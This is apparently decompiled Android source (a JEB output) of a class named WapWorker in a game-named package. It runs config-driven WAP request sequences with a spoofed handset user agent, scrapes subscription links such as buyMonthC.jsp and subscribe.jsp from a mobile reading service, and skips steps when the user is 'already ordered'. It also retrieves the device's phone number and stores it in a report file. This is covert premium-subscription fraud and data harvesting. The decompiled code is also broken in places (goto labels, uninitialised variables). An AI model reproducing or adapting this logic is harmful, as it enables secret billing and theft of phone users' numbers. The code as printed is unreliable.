// Decompiled by JEB v1.5.201408040 - http://www.android-decompiler.com

package com.agame.http;

import android.content.Context;
import com.tyj.onepiece.http.beans.Param;
import com.tyj.onepiece.http.beans.WapUrl;
import com.tyj.onepiece.http.common.Base64;
import com.tyj.onepiece.http.common.CommUtil;
import com.tyj.onepiece.http.common.Constants;
import com.tyj.onepiece.http.common.IniReader;
import com.tyj.onepiece.http.common.IniReader$Section;
import com.tyj.onepiece.http.common.LogUtil;
import java.io.FileReader;
import java.io.IOException;
import java.io.StringReader;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

public class WapWorker {
    private Context ctx;
    private Map globalparamlst;
    private HttpUtils httptl;
    private LogUtil log;
    private ArrayList paramlist;
    int ppp;
    public ArrayList sendlst;
    private String statics_addr;
    public String strUserAgent;
    private String strnumber;
    private int wapindex;

    public WapWorker(Context _ctx) {
        super();
        this.sendlst = new ArrayList();
        this.strUserAgent = "NokiaN81";
        this.wapindex = 0;
        this.globalparamlst = new HashMap();
        this.paramlist = new ArrayList();
        this.ppp = 1;
        this.ctx = _ctx;
        this.log = ServiceInstance.log;
    }

    public void add_wapurl(String strurl) {
        this.sendlst.add(strurl);
    }

    public int doAction() {
        IniReader v1;
        int v3 = -1;
        try {
            v1 = new IniReader(new FileReader(Constants.CONFIG_PATH(this.ctx)));
        }
        catch(IOException v2) {
            this.log.trace("wap", "cfg error");
            return v3;
        }

        if(!"30".equals(v1.getValue("global", "servicetype"))) {
            String v7 = v1.getValue("global", "useragent");
            String v6 = this.getstrlen(v7) > 0 ? new String(Base64.decode(v7, 0)) : "NokiaN81";
            if(this.getstrlen(v6) > 0) {
                this.strUserAgent = v6;
            }

            Section v8 = v1.getSection("wap");
            if(v8 == null) {
                goto label_67;
            }

            Iterator v11 = v8.datas.iterator();
            while(v11.hasNext()) {
                this.add_wapurl(v11.next().second);
            }

            v3 = -1;
            if(this.sendlst.size() > 0) {
                v3 = this.do_wapbycm();
            }

            if(v3 != 0) {
                this.log.trace("wap", "wapcm error " + v3);
            }
            else {
                return 0;
            label_67:
                this.log.trace("wap", "wapurl none");
                v3 = 0;
            }
        }

        return v3;
    }

    private byte[] do_http_work(WapUrl wl) {
        byte[] v10 = null;
        if(this.getstrlen(wl.wpurl) > 0) {
            wl.wpurl = CommUtil.encodeurl(wl.wpurl);
            this.httptl.user_agent = this.strUserAgent;
            if(wl.body == null) {
                if(wl.httptype != 0 && wl.httptype != 2) {
                    return this.httptl.httppostbyte(wl.wpurl, null, "", 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
                }

                v10 = this.httptl.httpgetbyte(wl.wpurl, 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
            }
            else if(wl.httptype == 3) {
                this.log.trace("post msg", new String(wl.body));
                v10 = this.httptl.httppostbyte(wl.wpurl, wl.body, "post900", 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
            }
            else if(wl.httptype == 1) {
                this.log.trace("post msg", new String(wl.body));
                v10 = this.httptl.httppostbyte(wl.wpurl, wl.body, "", 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
            }
            else {
                this.log.trace("get msg", new String(wl.body));
                v10 = this.httptl.httpgetbyte(String.valueOf(wl.wpurl) + "&" + wl.body, 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
            }
        }

        return v10;
    }

    private int do_wap_request(String strwapurl) {
        int v8;
        if(this.getstrlen(strwapurl) == 0 || !strwapurl.contains(";")) {
            this.log.trace("wap", "wapurl null or ;");
            v8 = -1;
        }
        else {
            WapUrl v7 = new WapUrl();
            int v1 = this.getWapUrl(strwapurl, v7);
            if(v1 != 0) {
                v8 = v1;
            }
            else {
                byte[] v5 = this.do_http_work(v7);
                if(v5 == null) {
                    v1 = -1;
                }

                StringBuilder v8_1 = new StringBuilder("param");
                int v9 = this.ppp;
                this.ppp = v9 + 1;
                new LogUtil(Constants.LOG_PATH, v8_1.append(v9).append(".txt").toString()).tracebyte("", v5);
                if(v1 == 0) {
                    if(this.getstrlen(v7.writelabel_param) > 0) {
                        this.setparam(v7.writelabel_param, v5);
                    }

                    if(v7.write_params == null) {
                        goto label_51;
                    }

                    if(v7.write_params.length <= 0) {
                        goto label_51;
                    }

                    int v2;
                    for(v2 = 0; v2 < v7.write_params.length; ++v2) {
                        this.set_globalparam(v7.write_params[v2], CommUtil.getKValue(new String(v5), v7.write_params[v2]));
                    }
                }

            label_51:
                v8 = v1;
            }
        }

        return v8;
    }

    private int do_wapbycm() {
        int v4 = 0;
        int v9 = -111;
        this.log.trace("wap", "wapcm start");
        int v1 = 0;
        int v0 = this.sendlst.size();
        this.wapindex = 0;
        this.httptl = new HttpUtils(this.ctx);
        while(this.wapindex < v0) {
            this.log.trace("", "");
            this.log.trace("wap", "step " + (this.wapindex + 1) + " start ");
            v1 = this.do_wap_request(this.sendlst.get(this.wapindex));
            if(v1 != 0 && v1 != v9) {
                break;
            }

            if(v1 == v9) {
                this.log.trace("wap", "quit wap because ordered already");
                String v2 = String.valueOf(this.statics_addr) + ";2;0;0;0;;;param10;;;;;";
                this.log.trace("wap", v2);
                this.wapindex = v0;
                v1 = this.do_wap_request(v2);
                break;
            }

            ++this.wapindex;
        }

        this.log.trace("wap", "wapcm end ");
        if(v1 != 0 || this.wapindex != v0) {
            this.log.trace("wap", "step error " + (this.wapindex + 1));
            v4 = this.wapindex + 1;
        }
        else {
            this.log.trace("wap", "all step ok");
        }

        return v4;
    }

    public boolean dotestAction() {
        boolean v1;
        this.log.trace("wap", "do testAction");
        this.add_wapurl("http://wap.cmread.com/r/a/lj?&s=/p/buyMonthC.jsp&nid=396257292&cm=M5920004;2;0;0;0;;;param3;;;;;");
        this.add_wapurl("{param3};2;0;0;0;;;param4;http://wap.cmread.com~a~<a href~>~(subscribe.jsp&&&|&&&)~~~href~~;;;;");
        int v0 = -1;
        if(this.sendlst.size() > 0) {
            v0 = this.do_wapbycm();
        }

        if(v0 != 0) {
            this.log.trace("wap", "wapcm error");
            v1 = false;
        }
        else {
            v1 = true;
        }

        return v1;
    }

    public String findurl(byte[] data, String node, String prop, String left, String right, String host, String rule, String postfmt, String urlparam) {
        int v17;
        int v15;
        String[] v14;
        Element v28;
        Document v7;
        String v32;
        String v23;
        int v24;
        int v22;
        String v4;
        try {
            v4 = new String(data, "utf-8");
        }
        catch(UnsupportedEncodingException v11) {
            v11.printStackTrace();
        }

        String v26 = "";
        int v25 = -1;
        int v27 = right.length();
        int v18 = left.length();
        if(this.getstrlen(node) <= 0) {
            goto label_285;
        }

        if(v27 <= 0) {
            goto label_27;
        }

        if(v18 <= 0) {
            goto label_27;
        }

        int v12 = 0;
        while(true) {
        label_19:
            v22 = v4.indexOf(left);
            v24 = v4.indexOf(right, v22 + v18);
            if(v22 < 0) {
                goto label_27;
            }

            if(v24 <= 0) {
                goto label_27;
            }

            String v31 = v4.substring(v22, v24 + v27);
            if(this.matchrule(v31, rule) == 0) {
                v23 = "";
                if(this.getstrlen(v31) != 0) {
                    v32 = "";
                    try {
                        DocumentBuilder v8 = DocumentBuilderFactory.newInstance().newDocumentBuilder();
                        if(!v31.trim().endsWith("/>")) {
                            v31 = String.valueOf(v31) + "asdf</" + node + ">";
                        }

                        InputSource v16 = new InputSource(new StringReader(v31));
                        v16.setEncoding("utf-8");
                        try {
                            v7 = v8.parse(v16);
                        }
                        catch(IOException v10_1) {
                            v12 = -1;
                        }
                        catch(SAXException v10_2) {
                            v12 = -1;
                        }
                    }
                    catch(Throwable v34) {
                        goto label_257;
                    }
                    catch(ParserConfigurationException v10) {
                        goto label_248;
                    }

                    if(v12 != 0) {
                        goto label_146;
                    }

                    try {
                        v28 = v7.getDocumentElement();
                        if(v28 == null) {
                            goto label_245;
                        }

                        v32 = v28.getNodeValue();
                        if(this.getstrlen(prop) > 0) {
                            v32 = v28.getAttribute(prop);
                        }

                        v14 = postfmt.split(",");
                        v15 = 0;
                        break;
                    }
                    catch(Throwable v34) {
                        goto label_257;
                    }
                    catch(ParserConfigurationException v10) {
                        goto label_248;
                    }

                label_245:
                    v12 = -1;
                    goto label_146;
                }

                v12 = -1;
                goto label_155;
            }

            v4 = v4.substring(v24 + v27);
        }

        try {
            while(true) {
            label_139:
                if(v15 >= v14.length) {
                    goto label_143;
                }

                String[] v13 = v14[v15].split(":");
                if(v13.length == 3) {
                    NodeList v20 = v28.getElementsByTagName(v13[0]);
                    int v6 = v20.getLength();
                    v17 = 0;
                    while(true) {
                    label_182:
                        if(v17 < v6) {
                            String v33 = v13[1];
                            Node v19 = v20.item(v17);
                            String v29 = v19.getAttribute(v33);
                            if(this.getstrlen(v29) > 0 && (v29.equalsIgnoreCase(v13[2]))) {
                                String v30 = v19.getAttribute("value");
                                if(this.getstrlen(v30) > 0) {
                                    if(this.getstrlen(v23) > 0) {
                                        v23 = String.valueOf(v23) + "&";
                                    }

                                    v23 = String.valueOf(String.valueOf(String.valueOf(v23) + v13[2]) + "=") + v30;
                                    goto label_184;
                                }
                            }

                            goto label_243;
                        }

                        goto label_184;
                    }
                }

                goto label_184;
            }
        }
        catch(Throwable v34) {
            goto label_257;
        }
        catch(ParserConfigurationException v10) {
            goto label_248;
        }

    label_243:
        ++v17;
        goto label_182;
    label_184:
        ++v15;
        goto label_139;
    label_143:
        goto label_146;
    label_248:
        v12 = -1;
    label_146:
        if(v32 != null) {
            v26 = String.valueOf("") + v32;
        }
        else {
            v12 = -1;
        }

    label_155:
        if(v12 != 0) {
            v4 = v4.substring(v24 + v27);
            goto label_19;
        }

        if(this.getstrlen(v23) > 0) {
            v26 = String.valueOf(String.valueOf(v26) + "&") + v23;
        }

        v25 = 0;
        goto label_27;
    label_257:
        throw v34;
    label_285:
        v4 = CommUtil.replacescapechar(v4);
        right = CommUtil.replacescapechar(right);
        left = CommUtil.replacescapechar(left);
        v27 = right.length();
        v18 = left.length();
        if(v27 > 0 && v18 > 0) {
            while(true) {
                v26 = "";
                v22 = v4.indexOf(left);
                int v3 = v4.length();
                v24 = v4.indexOf(right, v22 + v18);
                if(v22 < 0) {
                    break;
                }

                if(v24 < 0) {
                    break;
                }

                if(v22 + v18 > v3) {
                    break;
                }

                if(v22 + v18 < v24 + v27) {
                    v26 = v4.substring(v22 + v18, v24);
                }

                if(this.matchrule(v26, rule) == 0) {
                    v25 = 0;
                    break;
                }

                v4 = v4.substring(v24 + v27);
            }
        }

    label_27:
        if(v25 == 0) {
            v26 = CommUtil.cutescapechar(CommUtil.replacescapechar(v26.trim()));
            if(!v26.contains("http://") && this.getstrlen(host) != 0) {
                v26 = String.valueOf(host) + v26;
            }

            v26 = String.valueOf(v26) + urlparam;
            if(v26.contains("http://")) {
                return v26;
            }

            v26 = "http://" + v26;
        }

        return v26;
    }

    public int getMouaByNet() {
        int v4 = 0;
        int v5 = -1;
        int v1 = 0;
        int v0 = this.sendlst.size();
        this.wapindex = 0;
        this.httptl = new HttpUtils(this.ctx);
        do {
            if(this.wapindex >= v0) {
                break;
            }

            Object v3 = this.sendlst.get(this.wapindex);
            ++this.wapindex;
            v1 = this.do_wap_request(((String)v3));
        }
        while(v1 == 0);

        if(v1 == 0) {
            this.strnumber = this.get_globalparam("number");
            String v2 = this.get_globalparam("ua");
            this.log.trace("moua number:", this.strnumber);
            this.log.trace("moua ua:", v2);
            if(this.strnumber != null && this.strnumber.length() != 0 && !this.strnumber.equalsIgnoreCase("0")) {
                if(this.strnumber.equalsIgnoreCase("13000000000")) {
                    v4 = -2;
                }
                else {
                    CommUtil.setKeyValueNode(Constants.REPORT_PATH(this.ctx), "report", "number", this.strnumber);
                    CommUtil.setKeyValueNode(Constants.REPORT_PATH(this.ctx), "report", "ua", v2);
                }

                return v4;
            }

            v4 = v5;
        }
        else {
            v4 = v5;
        }

        return v4;
    }

    private int getWapUrl(String strwapurl, WapUrl url) {
        int v3;
        IniReader v0;
        String v27;
        String[] v19 = strwapurl.split("\\;");
        int v20 = v19.length;
        int v28 = 0;
        if(v20 > 0) {
            v27 = v19[0];
            if(v27.contains("{")) {
                url.readlabel_param = CommUtil.getparamValue(v27);
            }
            else {
                if(v27.contains("#number#")) {
                    try {
                        v0 = new IniReader(new FileReader(Constants.REPORT_PATH(this.ctx)));
                    }
                    catch(IOException v16) {
                        this.log.trace("servlog", "sleep error");
                        v3 = -1;
                        return v3;
                    }

                    v27 = CommUtil.replaceword(v27, "#number#", v0.getValue("report", "number"));
                }

                url.wpurl = v27;
            }
        }

        if(v20 > 1 && this.getstrlen(v19[1]) > 0) {
            url.httptype = Integer.parseInt(v19[1]);
            url.is_setrefer = false;
            if(v20 > 3 && this.getstrlen(v19[3]) > 0) {
                url.is_setcookie = Integer.parseInt(v19[3]);
                if(v20 > 4 && this.getstrlen(v19[4]) > 0) {
                    url.accessbytecount = Integer.parseInt(v19[4]);
                }

                if(v20 > 5 && this.getstrlen(v19[5]) > 0 && (v19[5].contains("$"))) {
                    String[] v25 = v19[5].split("\\$");
                    url.write_params = new String[]{v25[1], v25[2]};
                }

                if(v20 > 6 && this.getstrlen(v19[6]) > 0) {
                    this.log.trace("video tag", v19[6]);
                    v28 = 1;
                }

                if(v20 > 7 && this.getstrlen(v19[7]) > 0) {
                    url.writelabel_param = v19[7];
                }

                if(this.getstrlen(url.readlabel_param) == 0) {
                    if(url.wpurl == null) {
                        this.log.trace("wap", "itemlst8 url error");
                        return -1;
                    }
                }
                else if(v20 > 8) {
                    String[] v29 = String.valueOf(v19[8]) + "et".split("~");
                    if(v29.length > 0) {
                        byte[] v4 = this.getparam(url.readlabel_param);
                        if(v4 == null) {
                            return -1;
                        }
                        else if(v29.length >= 10) {
                            String v10 = this.getwapfmt9rule(v29[4]);
                            this.log.trace("rule5", v10);
                            String v18 = this.findurl(v4, v29[1], v29[7], v29[2], v29[3], v29[0], v10, v29[5], v29[6]);
                            if(this.getstrlen(v18) == 0) {
                                this.log.trace("rule5", "can not finded");
                                return -1;
                            }
                            else {
                                url.wpurl = v18;
                                String v24 = this.getwapfmt9rule(v29[8]);
                                this.log.trace("rule9", v24);
                                if(this.getstrlen(v24) > 0 && this.matchrule(v18, v24) == 0) {
                                    String v13 = v29[9];
                                    if(v13.equalsIgnoreCase("exit")) {
                                        this.wapindex = this.sendlst.size();
                                    }
                                    else if(v13.contains("wapurl")) {
                                        String v26 = v13.substring(6);
                                        if(v26 != null) {
                                            this.wapindex = Integer.parseInt(v26) - 1;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                if(v20 > 9) {
                    v27 = v19[9];
                    if(this.getstrlen(v27) <= 0) {
                        goto label_366;
                    }

                    if(v27.contains("{")) {
                        url.body = null;
                        url.body = this.getparam(CommUtil.getparamValue(v27));
                        if(v28 == 0) {
                            goto label_366;
                        }

                        this.log.trace("video tag", "need know if ordered or not because of video order instructions");
                        try {
                            String v14 = new String(url.body, "utf-8");
                        }
                        catch(UnsupportedEncodingException v17) {
                            v17.printStackTrace();
                        }

                        if(!v14.contains(v19[6])) {
                            goto label_366;
                        }

                        this.log.trace("video tag", v19[6]);
                        this.log.trace("video tag", "already ordered, skip next");
                        if(v20 > 10 && this.getstrlen(v19[10]) > 0) {
                            this.log.trace("ordered statistics addr", v19[10]);
                            this.statics_addr = v19[10];
                        }

                        return -111;
                    }

                    url.body = url.body != null ? CommUtil.getMergeBytes(url.body, v27.getBytes()) : v27.getBytes().clone();
                }

            label_366:
                if(v20 > 11) {
                    v27 = v19[11];
                    if(this.getstrlen(v27) > 0) {
                        this.strUserAgent = v27;
                    }
                }

                return 0;
            }

            this.log.trace("wap", "itemlst3 null");
            v3 = -1;
        }
        else {
            this.log.trace("wap", "itemlst1 null");
            v3 = -1;
        }

        return v3;
    }

    public String get_globalparam(String key) {
        Object v0;
        if((this.globalparamlst.isEmpty()) || !this.globalparamlst.containsKey(key)) {
            String v0_1 = "";
        }
        else {
            v0 = this.globalparamlst.get(key);
        }

        return ((String)v0);
    }

    private byte[] getparam(String label_param) {
        byte[] v2;
        int v1 = this.paramlist.size();
        int v0 = 0;
        while(true) {
            if(v0 >= v1) {
                return null;
            }
            else if(this.paramlist.get(v0).key.equalsIgnoreCase(label_param)) {
                v2 = this.paramlist.get(v0).value;
            }
            else {
                ++v0;
                continue;
            }

            return v2;
        }

        return null;
    }

    private int getstrlen(String str) {
        int v0 = str == null ? 0 : str.length();
        return v0;
    }

    private String getwapfmt9rule(String subformat) {
        String v0 = subformat.contains("(") ? CommUtil.getparamValue(subformat) : "";
        return v0;
    }

    private int matchrule(String data, String rule) {
        String[] v6 = rule.split("\\|");
        int v4 = 1;
        int v5 = v6.length;
        int v2;
        for(v2 = 0; v2 < v5; ++v2) {
            String[] v9 = v6[v2].split("\\&");
            int v0 = 1;
            int v8 = v9.length;
            if(v8 > 0) {
                int v3 = 0;
                while(v3 < v8) {
                    if(!data.contains(v9[v3])) {
                        v0 = 0;
                        v4 = 0;
                    }
                    else {
                        ++v3;
                        continue;
                    }

                    break;
                }

                if(v0 == 0) {
                    goto label_16;
                }

                v4 = 1;
                break;
            }

        label_16:
        }

        int v10 = v4 != 0 ? 0 : -1;
        return v10;
    }

    public void set_globalparam(String key, String value) {
        this.globalparamlst.put(key, value);
    }

    private void setparam(String label_param, byte[] data) {
        int v1 = this.paramlist.size();
        int v0 = 0;
        while(true) {
            if(v0 >= v1) {
                break;
            }
            else if(this.paramlist.get(v0).key.equalsIgnoreCase(label_param)) {
                this.paramlist.get(v0).value = null;
                this.paramlist.get(v0).value = data.clone();
            }
            else {
                ++v0;
                continue;
            }

            return;
        }

        this.paramlist.add(new Param(label_param, data));
    }
}

